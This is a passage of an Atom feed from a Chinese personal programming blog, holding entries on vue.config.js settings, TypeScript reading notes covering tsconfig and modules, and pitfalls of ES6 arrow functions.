      <category term="服务端" scheme="https://zhanghao-web.github.io/tags/%E6%9C%8D%E5%8A%A1%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>vue.config.js基本配置</title>
    <link href="https://zhanghao-web.github.io/2020/04/01/Vue/vue-config-js%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/"/>
    <id>https://zhanghao-web.github.io/2020/04/01/Vue/vue-config-js基本配置/</id>
    <published>2020-04-01T08:06:12.000Z</published>
    <updated>2020-04-01T08:07:04.000Z</updated>
    
    <content type="html"><![CDATA[<pre><code class="js">// vue.config.js 基本配置方法module.exports = {  // 项目部署的基础路径  // 我们默认假设你的应用将会部署在域名的根部，  // 比如 https://www.my-app.com/  // 如果你的应用时部署在一个子路径下，那么你需要在这里  // 指定子路径。比如，如果你的应用部署在  // https://www.foobar.com/my-app/  // 那么将这个值改为 `/my-app/`  // 基本路径 baseURL已经过时  publicPath: &#39;./&#39;,    // 打包项目时构建的文件目录，用法与webpack本身的output.path一致  outputDir: &#39;dist&#39;,   // 静态资源目录 (js, css, img, fonts)  assetsDir: &#39;assets&#39;,  // eslint-loader 是否在保存的时候检查，编译不规范时，设为true在命令行中警告，若设为error则不仅警告，并且编译失败  lintOnSave: true,  // 调整内部的 webpack 配置。查阅 https://github.com/vuejs/vue-docs-zh-cn/blob/master/vue-cli/webpack.md  chainWebpack: () =&gt; {},  configureWebpack: () =&gt; {},  // vue-loader 配置项 https://vue-loader.vuejs.org/en/options.html   vueLoader: {},  // 生产环境是否生成 sourceMap 文件，默认true，若不需要生产环境的sourceMap，可以设置为false，加速生产环境的构建  productionSourceMap: true,  // css相关配置  css: {   // 是否使用css分离插件 ExtractTextPlugin，采用独立样式文件载入，不采用&lt;style&gt;方式内联至html文件中   extract: true,   // 是否在构建样式地图，false将提高构建速度   sourceMap: false,   // css预设器配置项   loaderOptions: {},   // 启用 CSS modules for all css / pre-processor files.   // 这个选项不会影响 `*.vue` 文件   modules: false  },  // 在生产环境下为 Babel 和 TypeScript 使用 `thread-loader`  // 在多核机器下会默认开启。  parallel: require(&#39;os&#39;).cpus().length &gt; 1,  // 是否启用dll See https://github.com/vuejs/vue-cli/blob/dev/docs/cli-service.md#dll-mode  dll: false,  // PWA 插件相关配置 see https://github.com/vuejs/vue-cli/tree/dev/packages/%40vue/cli-plugin-pwa  pwa: {},  // webpack-dev-server 相关配置  devServer: {   open: process.platform === &#39;darwin&#39;,   host: &#39;0.0.0.0&#39;,//如果是真机测试，就使用这个IP   port: 1234,   https: false,   hotOnly: false,   proxy: null, // 设置代理   // proxy: {   //     &#39;/api&#39;: {   //         target: &#39;&lt;url&gt;&#39;,   //         ws: true,   //         changOrigin: true   //     }   // },   before: app =&gt; {}  },  // 第三方插件配置  pluginOptions: {   // ...  } }</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code class=&quot;js&quot;&gt;// vue.config.js 基本配置方法
module.exports = {
  // 项目部署的基础路径
  // 我们默认假设你的应用将会部署在域名的根部，
  // 比如 https://www.my-app.com/
 
      
    
    </summary>
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/categories/Vue/"/>
    
    
      <category term="Vue" scheme="https://zhanghao-web.github.io/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>&lt;深入理解TypeScript读书笔记&gt;（一）</title>
    <link href="https://zhanghao-web.github.io/2020/03/25/Ts/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3TypeScript%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://zhanghao-web.github.io/2020/03/25/Ts/深入理解TypeScript读书笔记-（一）/</id>
    <published>2020-03-25T13:07:50.000Z</published>
    <updated>2020-03-25T14:41:04.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="书本地址"><a href="#书本地址" class="headerlink" title="书本地址"></a>书本地址</h1><p><a href="https://jkchao.github.io/typescript-book-chinese/#why" target="_blank" rel="noopener">https://jkchao.github.io/typescript-book-chinese/#why</a></p><h2 id="什么是TypeScript-为什么要使用TypeScript"><a href="#什么是TypeScript-为什么要使用TypeScript" class="headerlink" title="什么是TypeScript,为什么要使用TypeScript?"></a>什么是TypeScript,为什么要使用TypeScript?</h2><p>根据TypeScript官网中的介绍，TypeScript - JavaScript the scales (属于Js的超集)，Ts发展至今已经是很多大型项目的标配，它提供的静态类型检查，大大的提高了代码的可维护性及可读性；同时提供最新和不断发展的Javascript特性，让我们能建立更加强壮的组件。</p><h2 id="从tsconfig-json配置看ts整体"><a href="#从tsconfig-json配置看ts整体" class="headerlink" title="从tsconfig.json配置看ts整体"></a>从tsconfig.json配置看ts整体</h2><h3 id="创建tsconfig-json文件，配置信息"><a href="#创建tsconfig-json文件，配置信息" class="headerlink" title="创建tsconfig.json文件，配置信息"></a>创建tsconfig.json文件，配置信息</h3><p>通过compilerOption来定制你的编译选项</p><pre><code class="json">{  &quot;compilerOptions&quot;: {    /* 基本选项 */    &quot;target&quot;: &quot;es5&quot;,                       // 指定 ECMAScript 目标版本: &#39;ES3&#39; (default), &#39;ES5&#39;, &#39;ES2015&#39;, &#39;ES2016&#39;, &#39;ES2017&#39;, or &#39;ESNEXT&#39;    &quot;module&quot;: &quot;commonjs&quot;,                  // 指定使用模块: &#39;commonjs&#39;, &#39;amd&#39;, &#39;system&#39;, &#39;umd&#39; or &#39;es2015&#39;    &quot;lib&quot;: [],                             // 指定要包含在编译中的库文件    &quot;allowJs&quot;: true,                       // 允许编译 javascript 文件    &quot;checkJs&quot;: true,                       // 报告 javascript 文件中的错误    &quot;jsx&quot;: &quot;preserve&quot;,                     // 指定 jsx 代码的生成: &#39;preserve&#39;, &#39;react-native&#39;, or &#39;react&#39;    &quot;declaration&quot;: true,                   // 生成相应的 &#39;.d.ts&#39; 文件    &quot;sourceMap&quot;: true,                     // 生成相应的 &#39;.map&#39; 文件    &quot;outFile&quot;: &quot;./&quot;,                       // 将输出文件合并为一个文件    &quot;outDir&quot;: &quot;./&quot;,                        // 指定输出目录    &quot;rootDir&quot;: &quot;./&quot;,                       // 用来控制输出目录结构 --outDir.    &quot;removeComments&quot;: true,                // 删除编译后的所有的注释    &quot;noEmit&quot;: true,                        // 不生成输出文件    &quot;importHelpers&quot;: true,                 // 从 tslib 导入辅助工具函数    &quot;isolatedModules&quot;: true,               // 将每个文件做为单独的模块 （与 &#39;ts.transpileModule&#39; 类似）.    /* 严格的类型检查选项 */    &quot;strict&quot;: true,                        // 启用所有严格类型检查选项    &quot;noImplicitAny&quot;: true,                 // 在表达式和声明上有隐含的 any类型时报错    &quot;strictNullChecks&quot;: true,              // 启用严格的 null 检查    &quot;noImplicitThis&quot;: true,                // 当 this 表达式值为 any 类型的时候，生成一个错误    &quot;alwaysStrict&quot;: true,                  // 以严格模式检查每个模块，并在每个文件里加入 &#39;use strict&#39;    /* 额外的检查 */    &quot;noUnusedLocals&quot;: true,                // 有未使用的变量时，抛出错误    &quot;noUnusedParameters&quot;: true,            // 有未使用的参数时，抛出错误    &quot;noImplicitReturns&quot;: true,             // 并不是所有函数里的代码都有返回值时，抛出错误    &quot;noFallthroughCasesInSwitch&quot;: true,    // 报告 switch 语句的 fallthrough 错误。（即，不允许 switch 的 case 语句贯穿）    /* 模块解析选项 */    &quot;moduleResolution&quot;: &quot;node&quot;,            // 选择模块解析策略： &#39;node&#39; (Node.js) or &#39;classic&#39; (TypeScript pre-1.6)    &quot;baseUrl&quot;: &quot;./&quot;,                       // 用于解析非相对模块名称的基目录    &quot;paths&quot;: {},                           // 模块名到基于 baseUrl 的路径映射的列表    &quot;rootDirs&quot;: [],                        // 根文件夹列表，其组合内容表示项目运行时的结构内容    &quot;typeRoots&quot;: [],                       // 包含类型声明的文件列表    &quot;types&quot;: [],                           // 需要包含的类型声明文件名列表    &quot;allowSyntheticDefaultImports&quot;: true,  // 允许从没有设置默认导出的模块中默认导入。    /* Source Map Options */    &quot;sourceRoot&quot;: &quot;./&quot;,                    // 指定调试器应该找到 TypeScript 文件而不是源文件的位置    &quot;mapRoot&quot;: &quot;./&quot;,                       // 指定调试器应该找到映射文件而不是生成文件的位置    &quot;inlineSourceMap&quot;: true,               // 生成单个 soucemaps 文件，而不是将 sourcemaps 生成不同的文件    &quot;inlineSources&quot;: true,                 // 将代码与 sourcemaps 生成到一个文件中，要求同时设置了 --inlineSourceMap 或 --sourceMap 属性    /* 其他选项 */    &quot;experimentalDecorators&quot;: true,        // 启用装饰器    &quot;emitDecoratorMetadata&quot;: true          // 为装饰器提供元数据的支持  }}</code></pre><h3 id="Ts编译生成Js文件"><a href="#Ts编译生成Js文件" class="headerlink" title="Ts编译生成Js文件"></a>Ts编译生成Js文件</h3><p>在目录下运行 <code>tsc</code>命令，会在当前目录或者父级目录下找<code>tsconfig.json</code>文件<br>运行 <code>tsc -p ./path-to-project-directory</code> 。当然，这个路径可以是绝对路径，也可以是相对于当前目录的相对路径。<br>使用 <code>tsc -w</code> 来启用 TypeScript 编译器的观测模式，在检测到文件改动之后，它将重新编译。</p><h3 id="显示的指定编译文件"><a href="#显示的指定编译文件" class="headerlink" title="显示的指定编译文件"></a>显示的指定编译文件</h3><pre><code class="js">{  &quot;files&quot;: [    &quot;./some/file.ts&quot;  ]}</code></pre><h2 id="声明空间"><a href="#声明空间" class="headerlink" title="声明空间"></a>声明空间</h2><h3 id="类型声明空间（class-interface-type）"><a href="#类型声明空间（class-interface-type）" class="headerlink" title="类型声明空间（class interface type）"></a>类型声明空间（class interface type）</h3><pre><code class="js">class Foo{}interface Bar{}type Bas{}</code></pre><p><strong>注意：</strong>尽管你定义了 interface Bar，却并不能够把它作为一个变量来使用，因为它没有定义在变量声明空间中。</p><h3 id="变量声明空间"><a href="#变量声明空间" class="headerlink" title="变量声明空间"></a>变量声明空间</h3><pre><code class="js">class Foo {}const someOne = Fooconst someOneVar = 123</code></pre><p><strong>注意</strong> 一些用 var 声明的变量，也只能在变量声明空间使用，不能用作类型注解。</p><a id="more"></a><h2 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h2><h3 id="全局模块"><a href="#全局模块" class="headerlink" title="全局模块"></a>全局模块</h3><p>类似js的中全局对象，是一种不安全的方式，可使用文件模块代替</p><pre><code class="js">const Foo = 123const Bar = Foo</code></pre><h3 id="文件模块"><a href="#文件模块" class="headerlink" title="文件模块"></a>文件模块</h3><p>文件模块也可以叫做外部模块，通过import,export导入导出，从而才能使用</p><pre><code class="js">//foo.jsexport const foo = 123//bar.jsimport {foo} from &#39;./foo.js&#39;const bar = foo</code></pre><h4 id="文件模块详情"><a href="#文件模块详情" class="headerlink" title="文件模块详情"></a>文件模块详情</h4><h5 id="ES模块语法"><a href="#ES模块语法" class="headerlink" title="ES模块语法"></a>ES模块语法</h5><p>导出</p><pre><code class="js">//使用 export 关键字导出一个变量或类型export const someVar = 123;export type someType = {  foo: string;};// export 的写法除了上面这种，还有另外一种：const someVar = 123;type someType = {  type: string;};export { someVar, someType };// 可以用重命名变量的方式导出：const someVar = 123;export { someVar as aDifferentName };</code></pre><p>导入</p><pre><code class="js">//使用 import 关键字导入一个变量或者是一个类型：import { someVar, someType } from &#39;./foo&#39;;//通过重命名的方式导入变量或者类型：import { someVar as aDifferentName } from &#39;./foo&#39;//可以使用整体加载，即用星号（*）指定一个对象，所有输出值都加载在这个对象上面：// 你可以使用 `foo.someVar` 和 `foo.someType` 以及其他任何从 `foo` 导出的变量或者类型import * as foo from &#39;./foo&#39;;//只导入模块：import &#39;core-js&#39;; // 一个普通的 polyfill 库//从其他模块导入后整体导出：export * from &#39;./foo&#39;;//从其他模块导入后，部分导出：export { someVar } from &#39;./foo&#39;;//通过重命名，部分导出从另一个模块导入的项目：export { someVar as aDifferentName } from &#39;./foo&#39;;//默认导入／导出,使用 export default// some varexport default (someVar = 123);//导入使用 import someName from &#39;someModule&#39; 语法（你可以根据需要为导入命名）：import someLocalNameForThisFile from &#39;./foo&#39;;</code></pre><h5 id="模块路径"><a href="#模块路径" class="headerlink" title="模块路径"></a>模块路径</h5><p>这里存在两种截然不同的模块：</p><blockquote><p>相对模块路径（路径以 . 开头，例如：./someFile 或者 ../../someFolder/someFile 等）；<br>其他动态查找模块（如：core-js，typestyle，react 或者甚至是 react/core 等）。</p></blockquote><h5 id="什么是-place"><a href="#什么是-place" class="headerlink" title="什么是 place"></a>什么是 place</h5><p>这个点指的应该是一个模块查找的过程</p><h5 id="重写类型的动态查找"><a href="#重写类型的动态查找" class="headerlink" title="重写类型的动态查找"></a>重写类型的动态查找</h5><p>在项目里，可以通过<code>declare module &#39;somePath&#39;</code> 声明一个全局模块的方式，来解决查找模块路径的问题。</p><h5 id="import-require-仅仅是导入类型"><a href="#import-require-仅仅是导入类型" class="headerlink" title="import/require 仅仅是导入类型"></a>import/require 仅仅是导入类型</h5><p>它实际上只做了两件事：</p><ul><li>导入 foo 模块的所有类型信息；</li><li>确定 foo 模块运行时的依赖关系。</li></ul><h2 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h2><p>在 JavaScript 可以使用匿名函数创建一个命名空间</p><pre><code class="js">(function(something) {  something.foo = 123;})(something || (something = {}));</code></pre><p>TypeScript 提供了 namespace 关键字来描述这种分组</p><pre><code class="js">namespace Utility {  export function log(msg) {    console.log(msg);  }  export function error(msg) {    console.log(msg);  }}// usageUtility.log(&#39;Call me&#39;);Utility.error(&#39;maybe&#39;);</code></pre><h2 id="动态导入表达式"><a href="#动态导入表达式" class="headerlink" title="动态导入表达式"></a>动态导入表达式</h2><p>动态导入表达式是 ECMAScript 的一个新功能，它允许你在程序的任意位置异步加载一个模块  </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;书本地址&quot;&gt;&lt;a href=&quot;#书本地址&quot; class=&quot;headerlink&quot; title=&quot;书本地址&quot;&gt;&lt;/a&gt;书本地址&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://jkchao.github.io/typescript-book-chinese/#why&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://jkchao.github.io/typescript-book-chinese/#why&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;什么是TypeScript-为什么要使用TypeScript&quot;&gt;&lt;a href=&quot;#什么是TypeScript-为什么要使用TypeScript&quot; class=&quot;headerlink&quot; title=&quot;什么是TypeScript,为什么要使用TypeScript?&quot;&gt;&lt;/a&gt;什么是TypeScript,为什么要使用TypeScript?&lt;/h2&gt;&lt;p&gt;根据TypeScript官网中的介绍，TypeScript - JavaScript the scales (属于Js的超集)，Ts发展至今已经是很多大型项目的标配，它提供的静态类型检查，大大的提高了代码的可维护性及可读性；同时提供最新和不断发展的Javascript特性，让我们能建立更加强壮的组件。&lt;/p&gt;
&lt;h2 id=&quot;从tsconfig-json配置看ts整体&quot;&gt;&lt;a href=&quot;#从tsconfig-json配置看ts整体&quot; class=&quot;headerlink&quot; title=&quot;从tsconfig.json配置看ts整体&quot;&gt;&lt;/a&gt;从tsconfig.json配置看ts整体&lt;/h2&gt;&lt;h3 id=&quot;创建tsconfig-json文件，配置信息&quot;&gt;&lt;a href=&quot;#创建tsconfig-json文件，配置信息&quot; class=&quot;headerlink&quot; title=&quot;创建tsconfig.json文件，配置信息&quot;&gt;&lt;/a&gt;创建tsconfig.json文件，配置信息&lt;/h3&gt;&lt;p&gt;通过compilerOption来定制你的编译选项&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;json&quot;&gt;{
  &amp;quot;compilerOptions&amp;quot;: {

    /* 基本选项 */
    &amp;quot;target&amp;quot;: &amp;quot;es5&amp;quot;,                       // 指定 ECMAScript 目标版本: &amp;#39;ES3&amp;#39; (default), &amp;#39;ES5&amp;#39;, &amp;#39;ES2015&amp;#39;, &amp;#39;ES2016&amp;#39;, &amp;#39;ES2017&amp;#39;, or &amp;#39;ESNEXT&amp;#39;
    &amp;quot;module&amp;quot;: &amp;quot;commonjs&amp;quot;,                  // 指定使用模块: &amp;#39;commonjs&amp;#39;, &amp;#39;amd&amp;#39;, &amp;#39;system&amp;#39;, &amp;#39;umd&amp;#39; or &amp;#39;es2015&amp;#39;
    &amp;quot;lib&amp;quot;: [],                             // 指定要包含在编译中的库文件
    &amp;quot;allowJs&amp;quot;: true,                       // 允许编译 javascript 文件
    &amp;quot;checkJs&amp;quot;: true,                       // 报告 javascript 文件中的错误
    &amp;quot;jsx&amp;quot;: &amp;quot;preserve&amp;quot;,                     // 指定 jsx 代码的生成: &amp;#39;preserve&amp;#39;, &amp;#39;react-native&amp;#39;, or &amp;#39;react&amp;#39;
    &amp;quot;declaration&amp;quot;: true,                   // 生成相应的 &amp;#39;.d.ts&amp;#39; 文件
    &amp;quot;sourceMap&amp;quot;: true,                     // 生成相应的 &amp;#39;.map&amp;#39; 文件
    &amp;quot;outFile&amp;quot;: &amp;quot;./&amp;quot;,                       // 将输出文件合并为一个文件
    &amp;quot;outDir&amp;quot;: &amp;quot;./&amp;quot;,                        // 指定输出目录
    &amp;quot;rootDir&amp;quot;: &amp;quot;./&amp;quot;,                       // 用来控制输出目录结构 --outDir.
    &amp;quot;removeComments&amp;quot;: true,                // 删除编译后的所有的注释
    &amp;quot;noEmit&amp;quot;: true,                        // 不生成输出文件
    &amp;quot;importHelpers&amp;quot;: true,                 // 从 tslib 导入辅助工具函数
    &amp;quot;isolatedModules&amp;quot;: true,               // 将每个文件做为单独的模块 （与 &amp;#39;ts.transpileModule&amp;#39; 类似）.

    /* 严格的类型检查选项 */
    &amp;quot;strict&amp;quot;: true,                        // 启用所有严格类型检查选项
    &amp;quot;noImplicitAny&amp;quot;: true,                 // 在表达式和声明上有隐含的 any类型时报错
    &amp;quot;strictNullChecks&amp;quot;: true,              // 启用严格的 null 检查
    &amp;quot;noImplicitThis&amp;quot;: true,                // 当 this 表达式值为 any 类型的时候，生成一个错误
    &amp;quot;alwaysStrict&amp;quot;: true,                  // 以严格模式检查每个模块，并在每个文件里加入 &amp;#39;use strict&amp;#39;

    /* 额外的检查 */
    &amp;quot;noUnusedLocals&amp;quot;: true,                // 有未使用的变量时，抛出错误
    &amp;quot;noUnusedParameters&amp;quot;: true,            // 有未使用的参数时，抛出错误
    &amp;quot;noImplicitReturns&amp;quot;: true,             // 并不是所有函数里的代码都有返回值时，抛出错误
    &amp;quot;noFallthroughCasesInSwitch&amp;quot;: true,    // 报告 switch 语句的 fallthrough 错误。（即，不允许 switch 的 case 语句贯穿）

    /* 模块解析选项 */
    &amp;quot;moduleResolution&amp;quot;: &amp;quot;node&amp;quot;,            // 选择模块解析策略： &amp;#39;node&amp;#39; (Node.js) or &amp;#39;classic&amp;#39; (TypeScript pre-1.6)
    &amp;quot;baseUrl&amp;quot;: &amp;quot;./&amp;quot;,                       // 用于解析非相对模块名称的基目录
    &amp;quot;paths&amp;quot;: {},                           // 模块名到基于 baseUrl 的路径映射的列表
    &amp;quot;rootDirs&amp;quot;: [],                        // 根文件夹列表，其组合内容表示项目运行时的结构内容
    &amp;quot;typeRoots&amp;quot;: [],                       // 包含类型声明的文件列表
    &amp;quot;types&amp;quot;: [],                           // 需要包含的类型声明文件名列表
    &amp;quot;allowSyntheticDefaultImports&amp;quot;: true,  // 允许从没有设置默认导出的模块中默认导入。

    /* Source Map Options */
    &amp;quot;sourceRoot&amp;quot;: &amp;quot;./&amp;quot;,                    // 指定调试器应该找到 TypeScript 文件而不是源文件的位置
    &amp;quot;mapRoot&amp;quot;: &amp;quot;./&amp;quot;,                       // 指定调试器应该找到映射文件而不是生成文件的位置
    &amp;quot;inlineSourceMap&amp;quot;: true,               // 生成单个 soucemaps 文件，而不是将 sourcemaps 生成不同的文件
    &amp;quot;inlineSources&amp;quot;: true,                 // 将代码与 sourcemaps 生成到一个文件中，要求同时设置了 --inlineSourceMap 或 --sourceMap 属性

    /* 其他选项 */
    &amp;quot;experimentalDecorators&amp;quot;: true,        // 启用装饰器
    &amp;quot;emitDecoratorMetadata&amp;quot;: true          // 为装饰器提供元数据的支持
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;Ts编译生成Js文件&quot;&gt;&lt;a href=&quot;#Ts编译生成Js文件&quot; class=&quot;headerlink&quot; title=&quot;Ts编译生成Js文件&quot;&gt;&lt;/a&gt;Ts编译生成Js文件&lt;/h3&gt;&lt;p&gt;在目录下运行 &lt;code&gt;tsc&lt;/code&gt;命令，会在当前目录或者父级目录下找&lt;code&gt;tsconfig.json&lt;/code&gt;文件&lt;br&gt;运行 &lt;code&gt;tsc -p ./path-to-project-directory&lt;/code&gt; 。当然，这个路径可以是绝对路径，也可以是相对于当前目录的相对路径。&lt;br&gt;使用 &lt;code&gt;tsc -w&lt;/code&gt; 来启用 TypeScript 编译器的观测模式，在检测到文件改动之后，它将重新编译。&lt;/p&gt;
&lt;h3 id=&quot;显示的指定编译文件&quot;&gt;&lt;a href=&quot;#显示的指定编译文件&quot; class=&quot;headerlink&quot; title=&quot;显示的指定编译文件&quot;&gt;&lt;/a&gt;显示的指定编译文件&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;{
  &amp;quot;files&amp;quot;: [
    &amp;quot;./some/file.ts&amp;quot;
  ]
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;声明空间&quot;&gt;&lt;a href=&quot;#声明空间&quot; class=&quot;headerlink&quot; title=&quot;声明空间&quot;&gt;&lt;/a&gt;声明空间&lt;/h2&gt;&lt;h3 id=&quot;类型声明空间（class-interface-type）&quot;&gt;&lt;a href=&quot;#类型声明空间（class-interface-type）&quot; class=&quot;headerlink&quot; title=&quot;类型声明空间（class interface type）&quot;&gt;&lt;/a&gt;类型声明空间（class interface type）&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;class Foo{}
interface Bar{}
type Bas{}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt;尽管你定义了 interface Bar，却并不能够把它作为一个变量来使用，因为它没有定义在变量声明空间中。&lt;/p&gt;
&lt;h3 id=&quot;变量声明空间&quot;&gt;&lt;a href=&quot;#变量声明空间&quot; class=&quot;headerlink&quot; title=&quot;变量声明空间&quot;&gt;&lt;/a&gt;变量声明空间&lt;/h3&gt;&lt;pre&gt;&lt;code class=&quot;js&quot;&gt;class Foo {}
const someOne = Foo
const someOneVar = 123
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt; 一些用 var 声明的变量，也只能在变量声明空间使用，不能用作类型注解。&lt;/p&gt;
    
    </summary>
    
      <category term="Js" scheme="https://zhanghao-web.github.io/categories/Js/"/>
    
    
      <category term="Ts" scheme="https://zhanghao-web.github.io/tags/Ts/"/>
    
  </entry>
  
  <entry>
    <title>你不知道的箭头函数</title>
    <link href="https://zhanghao-web.github.io/2020/03/15/Js/%E4%BD%A0%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/"/>
    <id>https://zhanghao-web.github.io/2020/03/15/Js/你不知道的箭头函数/</id>
    <published>2020-03-15T10:31:16.000Z</published>
    <updated>2020-03-18T13:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简言"><a href="#简言" class="headerlink" title="简言"></a>简言</h1><p>ES6的箭头函数，我们会在工作中经常知道，但是你知道什么时候使用箭头函数，什么时候不能使用箭头函数吗？</p><h2 id="什么时候使用箭头函数？"><a href="#什么时候使用箭头函数？" class="headerlink" title="什么时候使用箭头函数？"></a>什么时候使用箭头函数？</h2><blockquote><p>为啥大多数情况都使用箭头函数？</p></blockquote><p>作用域安全性:当箭头函数被一致使用时，所有东西都保证使用与根对象相同的this。如果一个标准函数回调与一堆箭头函数混合在一起，那么作用域就有可能变得混乱。</p><p>紧凑性:箭头函数更容易读写。</p><p>清晰度:使用箭头函数可明确知道当前 this 指向</p><p>其它情况使用箭头函数。</p><h2 id="什么时候不能使用箭头函数？"><a href="#什么时候不能使用箭头函数？" class="headerlink" title="什么时候不能使用箭头函数？"></a>什么时候不能使用箭头函数？</h2><h3 id="定义对象方法"><a href="#定义对象方法" class="headerlink" title="定义对象方法"></a>定义对象方法</h3><h4 id="定义字面量的方法"><a href="#定义字面量的方法" class="headerlink" title="定义字面量的方法"></a>定义字面量的方法</h4><pre><code class="js">const calculator = {    array: [1, 2, 3],    sum: () =&gt; {        console.log(this === window); // =&gt; true        return this.array.reduce((result, item) =&gt; result + item);    }};console.log(this === window); // =&gt; true// Throws &quot;TypeError: Cannot read property &#39;reduce&#39; of undefined&quot;calculator.sum();</code></pre><p>calculator.sum 使用箭头函数来定义，但是调用的时候会抛出 TypeError，因为运行时 this.array 是未定义的，调用 calculator.sum 的时候，执行上下文里面的 this 仍然指向的是 window，原因是箭头函数把函数上下文绑定到了 window 上，this.array 等价于 window.array，显然后者是未定义的。</p><p><strong>解决的办法</strong>是，使用函数表达式或者方法简写（ES6 中已经支持）来定义方法，这样能确保 this 是在运行时是由包含它的上下文决定的，</p><pre><code class="js">const calculator = {    array: [1, 2, 3],    sum() {        console.log(this === calculator); // =&gt; true        return this.array.reduce((result, item) =&gt; result + item);    }};calculator.sum(); // =&gt; 6</code></pre><h4 id="定义原型方法"><a href="#定义原型方法" class="headerlink" title="定义原型方法"></a>定义原型方法</h4><p>同样的规则适用于原型方法（prototype method）的定义，使用箭头函数会导致运行时的执行上下文错误</p><pre><code class="js">function Cat(name) {    this.name = name;}Cat.prototype.sayCatName = () =&gt; {    console.log(this === window); // =&gt; true    return this.name;};const cat = new Cat(&#39;Mew&#39;);cat.sayCatName(); // =&gt; undefined</code></pre><p><strong>解决方法</strong>:使用传统的函数表达式就能解决问题</p><h3 id="定义事件回调函数"><a href="#定义事件回调函数" class="headerlink" title="定义事件回调函数"></a>定义事件回调函数</h3><pre><code class="js">const button = document.getElementById(&#39;myButton&#39;);button.addEventListener(&#39;click&#39;, () =&gt; {    console.log(this === window); // =&gt; true    this.innerHTML = &#39;Clicked button&#39;;});</code></pre><p>在全局上下文下定义的箭头函数执行时 this 会指向 window，当单击事件发生时，浏览器会尝试用 button 作为上下文来执行事件回调函数，但是箭头函数预定义的上下文是不能被修改的，这样 this.innerHTML 就等价于 window.innerHTML，而后者是没有任何意义的。</p><p><strong>解决方法</strong>:使用传统的函数表达式就能解决问题</p><h3 id="定义构造函数"><a href="#定义构造函数" class="headerlink" title="定义构造函数"></a>定义构造函数</h3><p>构造函数中的 this 指向新创建的对象，当执行 new Car() 的时候，构造函数 Car 的上下文就是新创建的对象，也就是说 this instanceof Car === true。显然，箭头函数是不能用来做构造函数， 实际上 JS 会禁止你这么做，如果你这么做了，它就会抛出异常。</p><pre><code class="js">const Message = (text) =&gt; {    this.text = text;};// Throws &quot;TypeError: Message is not a constructor&quot;const helloMessage = new Message(&#39;Hello World!&#39;);</code></pre><h3 id="追求过短的代码"><a href="#追求过短的代码" class="headerlink" title="追求过短的代码"></a>追求过短的代码</h3><p>在代码可读性方面，最短的代码可能并不总是最好的。一定程度上，压缩了太多逻辑的简短代码，阅读起来就没有那么直观，</p><pre><code class="js">const multiply = (a, b) =&gt; b === undefined ? b =&gt; a * b : a * b;const double = multiply(2);double(3);      // =&gt; 6multiply(2, 3); // =&gt; 6</code></pre><p>multiply 函数会返回两个数字的乘积或者返回一个可以继续调用的固定了一个参数的函数。代码看起来很简短，但大多数人第一眼看上去可能无法立即搞清楚它干了什么，怎么让这段代码可读性更高呢？有很多办法，可以在箭头函数中加上括号、条件判断、返回语句，或者</p><pre><code class="js">function multiply(a, b) {    if (b === undefined) {        return function (b) {            return a * b;        }    }    return a * b;}const double = multiply(2);double(3); // =&gt; 6multiply(2, 3); // =&gt; 6</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;简言&quot;&gt;&lt;a href=&quot;#简言&quot; class=&quot;headerlink&quot; title=&quot;简言&quot;&gt;&lt;/a&gt;简言&lt;/h1&gt;&lt;p&gt;ES6的箭头函数，我们会在工作中经常知道，但是你知道什么时候使用箭头函数，什么时候不能使用箭头函数吗？&lt;/p&gt;
&lt;h2 id=&quot;什么时候使用
      
    
    </summary>
    
      <category term="Js" scheme="https://zhanghao-web.github.io/categories/Js/"/>
    
    
      <category term="ES6" scheme="https://zhanghao-web.github.io/tags/ES6/"/>
    
  </entry>
  
</feed>
